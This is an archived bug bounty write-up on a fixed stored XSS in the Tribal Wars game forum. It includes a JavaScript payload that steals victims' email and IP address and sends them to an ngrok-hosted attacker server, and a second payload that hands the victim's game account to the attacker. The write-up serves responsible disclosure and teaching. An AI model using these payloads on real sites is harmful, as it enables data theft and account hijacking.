---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2021-01-29_destroying-armies-and-villages-through-cross-site-scripting-bug-bounty-write-up.md
original_filename: 2021-01-29_destroying-armies-and-villages-through-cross-site-scripting-bug-bounty-write-up.md
title: Destroying Armies and Villages through Cross-Site Scripting - Bug Bounty Write-up
category: documents
detected_topics:
- xss
- jwt
- access-control
- command-injection
- otp
- automation-abuse
tags:
- imported
- documents
- xss
- jwt
- access-control
- command-injection
- otp
- automation-abuse
language: en
raw_sha256: 0fdcc9d68fb600e31763b484f863004f0f21992b0495bfd9b77f9473f89b5f6a
text_sha256: b3e2d8069cf8e16e42a65037c309bf3cd92b514b1eb22001536239a17d72bfbc
ingested_at: '2026-06-28T07:32:04Z'
sensitivity: unknown
redactions_applied: false
---

# Destroying Armies and Villages through Cross-Site Scripting - Bug Bounty Write-up

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2021-01-29_destroying-armies-and-villages-through-cross-site-scripting-bug-bounty-write-up.md
- Source Type: markdown
- Detected Topics: xss, jwt, access-control, command-injection, otp, automation-abuse
- Ingested At: 2026-06-28T07:32:04Z
- Redactions Applied: False
- Raw SHA256: `0fdcc9d68fb600e31763b484f863004f0f21992b0495bfd9b77f9473f89b5f6a`
- Text SHA256: `b3e2d8069cf8e16e42a65037c309bf3cd92b514b1eb22001536239a17d72bfbc`


## Content

---
title: "Destroying Armies and Villages through Cross-Site Scripting - Bug Bounty Write-up"
page_title: "Destroying Armies and Villages through Cross-Site Scripting - Bug Bounty Write-up - Fábio Freitas | @0xfabiof"
url: "https://0xfabiof.github.io/stored-xss-tw/"
final_url: "https://0xfabiof.github.io/stored-xss-tw/"
authors: ["Fábio Freitas (@0xfabiof)"]
programs: ["InnoGames"]
bugs: ["Stored XSS"]
bounty: "1,000"
publication_date: "2021-01-29"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 3954
---

![Destroying Armies and Villages through Cross-Site Scripting - Bug Bounty Write-up](/assets/img/tw.jpg)

# Destroying Armies and Villages through Cross-Site Scripting - Bug Bounty Write-up

2021, Jan 29 

![](https://i.imgur.com/pM2sSaE.png)

## Write-up

This is a story on how we exploited a Stored XSS vulnerability on the Tribes forum functionality of the very popular Browser game Tribal Wars to exfiltrate Personal Identifiable Information about the users as well as temporarily take-over another user’s game.

It all started when Intigriti launched their new [InnoGames](https://app.intigriti.com/researcher/programs/innogames/innogames/detail) Program. Immediately, I noted that one of my country’s most popular browser game of a few years ago - “TribalWars”, or “Tribos” in Portugal was in scope.

After testing a lot of endpoints for access control issues or potential injection vulnerabilities, I decided to create a Tribe and explore a bit about the functionality. This is a kind of “Guild”, in which you can invite other players to form an alliance with their villages. This Tribe functionality also contained a Forum functionality within, meant to be used as the alliance’s private board, to discuss strategy, etc.

![](https://i.imgur.com/927oJWT.png)

This is when I came across the Stored-XSS - even though all other parameters I had tested so far did some input sanitization on both Front-end and Back-end, this case was different: the “Subject” Parameter of a new Forum Topic only performed it on the client-side, which meant that we could intercept the request and simply add the payload. I added the very classic very boring XSS payload below and yep - everytime I visited the Tribe’s forum, I got the alert box.
  
  
  <script>alert()</script>
  

![](https://i.imgur.com/QwqHR5L.png)

![](https://i.imgur.com/Rm9mQeN.png)

![](https://i.imgur.com/Zz5Xzab.png)

Once I had this, I immediately screenshotted everything and submitted it to the program - who’s not afraid of the Duplicate monster right?

The report was triaged within the next day, but its Severity was lowered to a Medium - as I did not demonstrate any serious impact in my Proof-of-Concept. Fair enough, but the program did state I had the chance to appeal my case if a report was downgraded in Severity.

So let’s demonstrate impact - it was time to get creative.

With the help of [@0xSmiley](https://twitter.com/Nuno97Lopes), we started to brainstorm some ideas. We had two goals:

  * **User’s Personal/Sensitive Information Leak** \- as the program classified this as a priority

  * **Account Take-over** \- because it’s cool

### Exploiting the Stored XSS for Personal/Sensitive Information Leak

In order to do this, we browsed around the user’s profile for juicy information we could use for the Proof-of-Concept. We found that the application displays in the user’s profile his e-mail address, and also logs and displays the user’s IP information - should be enough.

![](https://i.imgur.com/aWE0tya.png)

So we crafted our JS payload (pii.js) to perform these two requests and then exilftrate their results to our server.
  
  
  // Obtain E-mail Information of the User
  var a = new XMLHttpRequest();
  a.open("GET", "https://xs1.tribalwars.cash/game.php?village=14&screen=settings&ajax=full_email_address", false);
  a.withCredentials = true;
  a.send();
  var email=a.response;
  
  // Obtain IP Information of the User
  var c = new XMLHttpRequest();
  c.open("GET","https://xs1.tribalwars.cash/game.php?village=14&screen=settings&mode=logins",false);
  c.withCredentials = true;
  c.send();
  var r = /\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b/;
  var ip_addr = c.response.match(r)[0];
  
  // Exilftrate it to an attacker-controlled server
  var b = new XMLHttpRequest();
  b.open("GET", "https://d33fd5150904.ngrok.io/?email="+email+"&ip="+ip_addr);
  b.send();
  

We did have the size limitation on the “Subject” parameter, which meant that this entire payload was not fittable inside it. However, the application also did not have in place any mechanism to prevent the importing of scripts from other sources, so we just hosted this .js file in an HTTPS server, and embedded it in the application via the vulnerable parameter:

![](https://i.imgur.com/Gf2bGMO.png)

As soon as our victim opens the forum, the above actions will be triggered and the attacker will receive on his server the user’s e-mail and IP information:

![](https://i.imgur.com/wNvi0TM.png)

### Exploiting the Stored XSS to Take-over a user’s Game

The first thing we always try once we have the XSS is to attempt to retrieve the Session Cookie used for authentication in order to take-over a user’s account. (Un)fortunately, TribalWars accounted for this and had the Session ID protected with the HTTPOnly flag, meaning our JavaScript payload could not access it. We also searched in the DOM to see if it was reflected somewhere we could reach but no luck there.

The next best thing is to attempt the requests for Password Change or E-mail Change - again (Un)fortunately, this was not possible either in a real attack scenario because both of these requests required the user to input his current password.

At this point we thought we could not achieve account-takeover, and we couldn’t. However, while browsing the application we found the next best thing:

That’s right, the game has a built-in feature called “Account-sitting”. The purpose of this functionality would be for a user to temporarily (for 48 hours) give control in certain authorized functionality to another user’s account, as can be seen in the two images below:

![](https://i.imgur.com/1hbQYzv.png)

![](https://i.imgur.com/1FWYANQ.png)

So the goal now was to create a JavaScript payload to:

  * Enable all Account Sitter Permissions

  * Request Account-Sitter back to the attacker’s account

This would give total control over the victim’s game to the attacker - allowing him to destroy the victim’s villages, resources, reputation, spend his currency, etc.
  
  
  // Set all Permissions to True on Account Sitter settings
  var a = new XMLHttpRequest();
  a.open("POST", "https://xs1.tribalwars.cash/game.php?village=14&screen=settings&mode=vacation&action=save_vacation_permissions", false);
  a.withCredentials = true;
  a.send("premium_view_log=on&premium_long_time=on&premium_one_time=on&igm=on&inventory=on&send_attack=on&send_support=on&recall_support=on&send_support_home=on&send_resources=on&ally=on&h=84b77029");
  
  // Request Account Sitting to Attacker's Account "Jose123"
  var b = new XMLHttpRequest();
  b.open("POST", "https://xs1.tribalwars.cash/game.php?village=14&screen=settings&mode=vacation&action=sitter_offer", false);
  b.withCredentials = true;
  b.send("sitter=Jose123&h=84b77029");
  

**Note:** The “h” parameter acts as a CSRF Token, but as usual in Stored XSS attacks, it can trivially be retrieved from the DOM and embedded in the payload.

Again, we created a new forum topic with the subject injecting our new JavaScript payload. As soon as the victim opens the Tribe forum, all Account Sitting settings will be enabled and the attacker’s Account, “Jose123” in this case - will receive a request on his account to control the victim’s game account for 48 hours with all permissions.

![](https://i.imgur.com/jfGUSTh.png)

It’s Game Over - literally.

After these scenarios were presented, InnoGames’ Security Team changed the Severity back to High and awarded this finding a 1000,00€ Bounty.

### Remediation:

  * Implement Server-side validations and sanitization of potentially malicious input - the TribalWars team has since deployed a fix to accomplish this
  * It’s also recommended the configuration of an effective Content-Security-Policy that would, even in cases of these type of vulnerabilities occuring, make the exploitation much harder

### Timeline:

  * 14/01/2021 - Reported
  * 14/01/2021 - Triaged
  * 15/01/2021 - Accepted
  * 18/01/2021 - Bounty of 1000,00 € Awarded
  * 25/01/2021 - Fixed
  * 29/01/2021 - Disclosed

[Twitter](https://twitter.com/intent/tweet?text=Destroying Armies and Villages through Cross-Site Scripting - Bug Bounty Write-up&url=/stored-xss-tw/ "Share on Twitter") [Facebook](https://facebook.com/sharer.php?u=/stored-xss-tw/ "Share on Facebook") [Google+](https://plus.google.com/share?url=/stored-xss-tw/ "Share on Google+")

[# bugbounty](/tags#bugbounty) [# application security](/tags#application security)
